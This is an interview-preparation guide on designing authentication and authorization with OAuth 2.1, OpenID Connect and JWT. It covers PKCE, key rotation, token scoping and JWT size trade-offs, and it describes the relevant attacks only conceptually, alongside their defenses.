When an interviewer asks *"How would you design authentication and authorization for our web, mobile, and microservice platform?"* or *"Explain how JWT, OAuth 2.0, and OpenID Connect work together"*, use this structured Principal framework.

### 1. The Senior Framing Strategy (First 60 Seconds)

In the first 60 seconds, establish clear architectural boundaries before drawing a single box:
1. **Separate the Three Orthogonal Concerns**:
   - **OAuth 2.1** is the *delegated authorization protocol* (how a client obtains a token).
   - **OIDC** is the *federated identity protocol* on top of OAuth (how the client authenticates the user via `id_token`).
   - **JWT (`JWS`)** is the *cryptographic wire format* used to represent tokens without stateful DB lookups.
2. **State the Non-Negotiable Cryptographic & Protocol Invariants**:
   - **Asymmetric Signing Only (`ES256` / `RS256`)**: The Identity Provider (IdP) signs tokens with a private key locked in KMS/HSM; microservices verify signatures locally using cached public keys from `/.well-known/jwks.json`. Never use symmetric `HS256` across microservices.
   - **Authorization Code + PKCE (`S256`) Everywhere**: All human-facing flows (Web BFF, SPA, iOS/Android) use Authorization Code + PKCE. Implicit and Password grants are dead (OAuth 2.1).
   - **Strict Token Separation (`id_token` $\neq$ `access_token`)**: The `id_token` stays at the Client/BFF (`aud = client_id`); the `access_token` (`typ = at+jwt`, `aud = api_uri`) goes to Resource Servers.
3. **Quantify Capacity, Header Overhead & Cache Math**:
   - **Wire Bandwidth**: A 2048-bit `RS256` JWT with 25 RBAC roles is $\sim 1.5\text{–}3\text{ KB}$, sent on *every* HTTP request (approaching Nginx's default $8\text{ KB}$ `large_client_header_buffers` limit). Switching to `ES256` saves $256\text{ B}$ on the signature alone, and adopting the **Phantom Token Pattern** keeps external payloads under $64\text{ B}$.
   - **Control-Plane Isolation**: Microservices cache JWKS keys in memory for $2\text{–}4\text{ hours}$ with outage tolerance (`outageTolerant(4h)`). Even if the IdP goes down for maintenance, existing token verification continues at $100{,}000+\text{ RPS}$ with $0\text{ ms}$ network latency.

---

### 2. Classic Interviewer Traps & Principal Rebuttals

#### Trap 1: "We built 'Log in with Google' using pure OAuth 2.0 by exchanging the code for an `access_token` and trusting that the user is logged in. Is that secure?"
* **Junior/Mid Answer:** "Yes, OAuth 2.0 is the industry standard for social login. Once you get an access token from Google, you know the user authenticated."
* **Principal Rebuttal:** "No — pure OAuth 2.0 is a **delegated authorization framework**, not an authentication protocol. An OAuth 2.0 `access_token` is opaque to the client and contains **no audience (`aud`) binding to your client application** and no `nonce` replay protection. If you accept an `access_token` (or call `/userinfo` with a raw token passed from a mobile client) as proof of login without verifying `aud == your_client_id`, an attacker who operates a malicious game app (`EvilApp`) where the victim logged in with Google can take the victim's valid Google `access_token` issued to `EvilApp` and replay it to your backend's login endpoint (**Token Substitution / Confused Deputy Attack**). You must use **OpenID Connect (OIDC)** (`scope=openid`) and verify the signed **`id_token`**, explicitly asserting `iss`, `aud == your_client_id`, `nonce`, and `exp`."

#### Trap 2: "Why do we need PKCE (`code_verifier` / `code_challenge`) if our web backend is a Confidential Client that already authenticates to `/token` with a `client_secret` over HTTPS?"
* **Junior/Mid Answer:** "PKCE is only needed for mobile apps and SPAs because they are public clients that cannot store a `client_secret`. Confidential backend servers don't need PKCE."
* **Principal Rebuttal:** "That was the 2015 mental model, but **OAuth 2.1 and RFC 9700 mandate PKCE for confidential clients too** because `client_secret` does **not** protect against **Authorization Code Injection**. Consider an attacker who intercepts or steals an authorization code from a victim's browser redirect (via referrer leak, malware, or proxy log). The attacker initiates a login flow on their own browser to obtain a valid `state` cookie with your confidential backend, then swaps their own callback URL's `code` parameter with the victim's stolen `code`. Your backend attaches its genuine `client_secret` and exchanges the victim's code at `/token`, logging the attacker into the victim's account! Only **PKCE** (or OIDC `nonce` bound to the user's session cookie) cryptographically binds the `authorization_code` to the specific browser session that initiated `/authorize`."

#### Trap 3: "We just rotated our JWT signing key on the Auth Server to mitigate a suspected leak, and immediately 40% of production API requests started failing with 401 Unauthorized. Why, and how do you design zero-downtime key rotation?"
* **Junior/Mid Answer:** "You just need to restart the microservices or clear their JWKS cache when you rotate the key."
* **Principal Rebuttal:** "An abrupt key replacement causes two distinct failure modes:
  1. **In-Flight Token Failure**: If you immediately delete the old public key (`kid_old`) from `/.well-known/jwks.json`, every valid 15-minute access token minted 10 seconds before the rotation fails verification whenever a pod refreshes its JWKS cache.
  2. **Cold-Cache / Rate-Limit Failure**: If you immediately start signing with `kid_new` before pods have pre-fetched it, all 500 microservice pods simultaneously miss `kid_new` in their local JWKS cache and stampede the IdP's `/jwks.json` endpoint.
  - **Normal Scheduled Rollover (3-Phase)**: Publish `kid_new` in `/jwks.json` passively for $2 \times \text{CacheTTL}$ first $\to$ switch signing to `kid_new` while retaining `kid_old` in `/jwks.json` $\to$ remove `kid_old` after $\text{MaxTokenTTL}$ expires.
  - **Emergency Compromise Rollover**: Remove `kid_compromised` immediately, publish `kid_new` behind CDN edge caching (`Cache-Control: public, max-age=60, s-maxage=300`), and force microservice JWKS caches to refresh with jitter while returning `401` so clients transparently execute their `/refresh` flow to acquire tokens signed by `kid_new`."

#### Trap 4: "Can a microservice just forward the user's incoming `Authorization: Bearer <jwt>` header across 5 downstream internal microservices so they all know who the user is?"
* **Junior/Mid Answer:** "Yes, forwarding the JWT header via a Feign/WebClient interceptor is standard practice so downstream services can read `SecurityContextHolder`."
* **Principal Rebuttal:** "Blindly forwarding the same broad-audience JWT across an internal call graph creates a **Lateral Movement / Confused Deputy vulnerability**. If you set `aud: 'internal-cluster'` so all 50 microservices accept the token, then a single RCE or SSRF in a low-privilege service (e.g., `AvatarResizeService`) allows an attacker to harvest incoming user JWTs from memory and call `PayoutService` to drain funds. Instead, enforce **Audience Scoping + OAuth 2.0 Token Exchange (RFC 8693)** or **mTLS Service Mesh Identity (SPIFFE/SPIRE)**: each downstream call either exchanges the token for a narrow `aud` + `act` (Actor) claim or pairs the user's JWT with a mutually authenticated SPIFFE X.509 workload certificate, and `PayoutService` enforces an authorization policy requiring *both* user scope AND `spiffe://prod/ns/checkout/sa/order-service` caller identity."

#### Trap 5: "Our JWT payload is Base64-encoded, so is it safe to put the user's internal database integer ID, email, and permission matrix inside it?"
* **Junior/Mid Answer:** "Base64 is not encryption, so you shouldn't put passwords in it, but user IDs and permissions are fine."
* **Principal Rebuttal:** "There are three production hazards with stuffing rich claims into public JWS tokens:
  1. **Reconnaissance & Privacy Leakage**: Base64Url is trivially decoded by anyone. Exposing sequential integer IDs (`sub: 1042`), internal role names (`ROLE_SUPER_FRAUD_OVERRIDE`), or PII (`email`, `phone`) in tokens stored on client devices violates GDPR data-minimization principles and aids attacker reconnaissance.
  2. **The 'Fat JWT' Header Bloat Problem**: An enterprise user in 80 AD groups produces a JWT $> 8\text{ KB}$, which immediately triggers `HTTP 431 Request Header Fields Too Large` or `502 Bad Gateway` on AWS ALB, Envoy, and Nginx.
  3. **Stale Authorization Window**: Permissions baked into a JWT cannot be downgraded until `exp`.
  - **The Fix**: Use **UUIDv7 / opaque `sub` identifiers**, keep claims minimal, or adopt the **Phantom Token Pattern** where external clients hold a 32-byte opaque reference token and the API Gateway swaps it for a rich internal JWS inside the private network."

---

### 3. Mid-Level vs. Principal Candidate Cheat Sheet

| Concept / Scenario | Mid-Level Candidate Says | Principal Candidate Demonstrates |
| :--- | :--- | :--- |
| **OAuth 2.0 vs. OIDC** | "OAuth is for authorization and OIDC is for authentication." | "OAuth 2.1 issues scoped `access_token`s (`typ: at+jwt`, `aud: api_uri`) for Resource Servers. OIDC adds the `id_token` (`aud: client_id`, `nonce`, `at_hash`) consumed strictly by the Client/BFF. Never send `id_token` as an API Bearer token." |
| **Signing Algorithm Selection** | "Use RS256 instead of HS256 so microservices only need the public key." | "Use asymmetric `ES256` (ECDSA P-256) or `EdDSA` (`Ed25519`) over `RS256` for $10\times$ faster signing and a $256\text{-byte}$ smaller HTTP header footprint, with keys served via `/.well-known/jwks.json` and pinned in `JWSVerificationKeySelector`." |
| **SPA Token Storage** | "Store the JWT in `HttpOnly` cookies instead of `localStorage` to prevent XSS." | "Deploy a **BFF (Backend-For-Frontend) Token Handler**: the SPA holds only an `__Host-session` (`HttpOnly; Secure; SameSite=Strict`) cookie, while the BFF manages PKCE exchange, Refresh Token Rotation, and attaches Bearer/DPoP tokens server-side." |
| **`state` vs. `PKCE` vs. `nonce`** | "They are random tokens used to secure the OAuth redirect." | "`state` prevents front-channel Login CSRF on `/callback`. `PKCE` (`S256` SHA-256 hash) prevents authorization code interception and injection on `/token`. `nonce` binds the OIDC `id_token` to the client session to block token replay." |
| **Stolen Access Token Defense** | "Make the access token expire in 5–15 minutes and use a Redis `jti` blocklist." | "Combine short TTLs + **Phantom Tokens** at the edge + **Sender-Constrained Tokens** (**DPoP RFC 9449** `cnf.jkt` for public clients, **mTLS RFC 8705** `cnf.x5t#S256` for M2M workloads) so stolen tokens cannot be replayed without the private key." |
| **JWKS Caching & Availability** | "Microservices fetch the public key from the Auth Server's JWKS URL." | "Configure `JWKSourceBuilder` with multi-hour TTL caching, outage tolerance (`outageTolerant`), and refresh rate-limiting (`rateLimited`) so an attacker spoofing random `kid` headers cannot trigger a cache-bypass DDoS against the IdP." |

---

## Related Security Guides

- [Authentication & Authorization Overview](./01-authentication-authorization.md) — The 7 core pillars of AuthN/AuthZ, MFA (TOTP, Passkeys/WebAuthn), RBAC, and ABAC.
- [Cookies vs. Sessions vs. JWT](./cookies-vs-sessions-vs-jwt.md) — Stateful vs. stateless session architectures and Spring Session Redis integration.
- [JWT Multi-Device Session Management & Invalidation](./refresh-token-security-invalidation.md) — Single-device vs. global logout, Refresh Token Rotation family trees, and Redis `revoked_before` watermarks.
- [Spring Security — Complete Guide](../spring/spring-security.md) — `SecurityFilterChain`, `AuthorizationFilter`, and `@PreAuthorize` internals.
